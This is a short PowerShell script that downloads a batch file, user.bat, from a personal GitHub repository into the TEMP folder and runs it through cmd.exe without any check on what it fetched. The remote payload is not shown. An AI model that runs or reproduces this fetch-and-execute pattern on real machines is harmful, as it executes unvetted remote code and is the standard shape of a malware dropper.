# Set the security protocol to TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Define the URL to fetch the script
$url = "https://raw.githubusercontent.com/karthik333711/ip/main/user.bat"

# Use a properly formatted header for GitHub API requests
$headers = @{
    "Accept" = "application/vnd.github.v3.raw"
}

# Path to save the batch file
$batchFilePath = "$env:TEMP\user.bat"

# Fetch the script content and save it to a file
try {
    $scriptContent = Invoke-RestMethod -Uri $url -Headers $headers
    Set-Content -Path $batchFilePath -Value $scriptContent -Force -Encoding ASCII
    Write-Host "Batch script downloaded to $batchFilePath"

    # Execute the batch file
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$batchFilePath`"" -Wait
} catch {
    Write-Error "Failed to fetch, save, or execute the script. $_"
}

exit

